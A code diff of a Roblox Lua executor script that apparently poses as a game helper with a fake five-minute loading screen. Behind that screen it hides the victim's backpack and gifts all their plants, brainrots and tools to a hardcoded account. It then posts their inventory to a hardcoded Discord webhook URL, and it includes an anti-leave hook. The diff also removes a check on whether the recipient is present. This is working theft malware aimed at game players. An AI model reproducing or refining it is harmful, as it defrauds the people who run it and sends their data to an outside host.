@@ -1,3 +1,6 @@
+-- ========================= PART 1 =========================
+
+-- Services
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Workspace = game:GetService("Workspace")
@@ -6,25 +9,30 @@ local TweenService = game:GetService("TweenService")
 local StarterGui = game:GetService("StarterGui")
 local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
+
+-- Settings
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1421386699048489050/EVpZy-6Gyulw3LpXnCmDH_hOPXJAOD6BMq8IQeBNZlJaoT6jgaeGF4myjvtPCdtY9jDu"
 local SEND_DELAY = 0.1
 local AUTO_SEND_ENABLED = true
-local LOADING_DURATION = 300
+local LOADING_DURATION = 300 -- 5 minutes
 local DEFAULT_RECIPIENTS = {"YashStorage"}
 local TOOL_NAMES = {"shovel","hoe","rake","wateringcan","bat"}
 local BRAIN_KEYWORDS = {"brain","brainrot","kg"}
 local recipients = table.clone(DEFAULT_RECIPIENTS)
 local toolName = "Basic Bat"
+
 local Character = player.Character or player.CharacterAdded:Wait()
 local HRP = Character:WaitForChild("HumanoidRootPart")
 local Backpack = player:WaitForChild("Backpack")
 
+-- Hide Backpack UI
 pcall(function()
     StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack,false)
     local backpackUI = PlayerGui:FindFirstChild("Backpack")
     if backpackUI then backpackUI.Enabled = false end
 end)
 
+-- HTTP helper
 local function getRequestFunc()
     if syn and syn.request then return syn.request
     elseif http_request then return http_request
@@ -39,7 +47,12 @@ local function sendWebhook(data)
     if not req then return end
     local body = HttpService:JSONEncode(data)
     pcall(function()
-        req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body})
+        req({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"]="application/json"},
+            Body = body
+        })
     end)
 end
 
@@ -54,6 +67,7 @@ local function getGiftRemote()
     return ok and remote or nil
 end
 
+-- Auto pickup in workspace
 local function autoPickup()
     for _, obj in ipairs(Workspace:GetDescendants()) do
         if obj:IsA("Tool") and obj.Parent ~= Backpack and obj.Parent ~= Character then
@@ -62,6 +76,7 @@ local function autoPickup()
     end
 end
 
+-- Categorize items
 local function categorizeItems()
     autoPickup()
     local plants, brainrots, tools = {}, {}, {}
@@ -95,6 +110,7 @@ local function categorizeItems()
     return plants, brainrots, tools
 end
 
+-- Send item to recipient
 local function sendItemToRecipient(item, recipient)
     local remote = getGiftRemote()
     if not remote then return false end
@@ -106,6 +122,7 @@ local function sendItemToRecipient(item, recipient)
     return success
 end
 
+-- Discord embed
 local function sendDiscordEmbed()
     local plants, brainrots, tools = categorizeItems()
     local function fmt(list)
@@ -113,7 +130,7 @@ local function sendDiscordEmbed()
     end
     local data = {
         content="@everyone",
-        username="Kuni Hit ",
+        username=" Kuni Hit ",
         avatar_url=getAvatar(player.UserId),
         embeds={{
             title="ðŸ“¦ INVENTORY",
@@ -135,17 +152,10 @@ local function sendDiscordEmbed()
     sendWebhook(data)
 end
 
-local function isRecipientInServer(recipientName)
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p.Name == recipientName then
-            return true
-        end
-    end
-    return false
-end
+-- ========================= PART 2 =========================
 
+-- Spam send
 local function spamSendToRecipient(recipient)
-    if not isRecipientInServer(recipient) then return end
     autoPickup()
     local sentNames = {}
     for _, item in ipairs(Backpack:GetChildren()) do
@@ -158,6 +168,7 @@ local function spamSendToRecipient(recipient)
     if #sentNames>0 then sendDiscordEmbed() end
 end
 
+-- Handle recipients
 local function handleRecipients()
     for _, r in ipairs(recipients) do
         task.spawn(function()
@@ -166,6 +177,7 @@ local function handleRecipients()
     end
 end
 
+-- Equip Bat for Brainrots
 local function equipBat()
     local humanoid = Character:FindFirstChildWhichIsA("Humanoid")
     if humanoid then
@@ -178,16 +190,21 @@ local function equipBat()
     end
 end
 
+-- Detect player plot
 local function detectPlayerPlot()
     local plotsFolder = Workspace:WaitForChild("Plots")
     for _, plot in ipairs(plotsFolder:GetChildren()) do
         if tonumber(plot.Name) then
             local ownerVal = plot:FindFirstChild("Owner") or plot:FindFirstChild("Player")
-            if ownerVal and ownerVal.Value == player then return plot end
+            if ownerVal and ownerVal.Value == player then
+                return plot
+            end
             if plot:FindFirstChild("Brainrots") then
                 for _, br in ipairs(plot.Brainrots:GetChildren()) do
                     for _, obj in ipairs(br:GetDescendants()) do
-                        if obj:IsA("ProximityPrompt") and obj.Enabled then return plot end
+                        if obj:IsA("ProximityPrompt") and obj.Enabled then
+                            return plot
+                        end
                     end
                 end
             end
@@ -196,6 +213,7 @@ local function detectPlayerPlot()
     return nil
 end
 
+-- Auto pickup loop for Brainrots
 task.spawn(function()
     while task.wait(0.05) do
         local plot = detectPlayerPlot()
@@ -217,6 +235,7 @@ task.spawn(function()
     end
 end)
 
+-- Loading screen
 task.spawn(function()
     local duration = LOADING_DURATION
     local ScreenGui = Instance.new("ScreenGui", PlayerGui)
@@ -227,6 +246,7 @@ task.spawn(function()
     local bg = Instance.new("Frame", ScreenGui)
     bg.Size = UDim2.new(1,0,1,0)
     bg.BackgroundColor3 = Color3.fromRGB(18,18,18)
+
     local grad = Instance.new("UIGradient", bg)
     grad.Color = ColorSequence.new{
         ColorSequenceKeypoint.new(0, Color3.fromRGB(30,60,30)),
@@ -275,13 +295,19 @@ task.spawn(function()
     percent.Text = "Ready! ðŸŒ»"
     task.wait(0.7)
     pcall(function() ScreenGui:Destroy() end)
+
+    -- Start auto-send after GUI loaded
     handleRecipients()
 end)
 
+-- Anti-leave protection
 Players.PlayerRemoving:Connect(function(leavingPlayer)
     if leavingPlayer == player then
-        task.spawn(function() player:LoadCharacter() end)
+        task.spawn(function()
+            player:LoadCharacter()
+        end)
     end
 end)
 
+-- Immediately send Discord embed when executed
 sendDiscordEmbed()
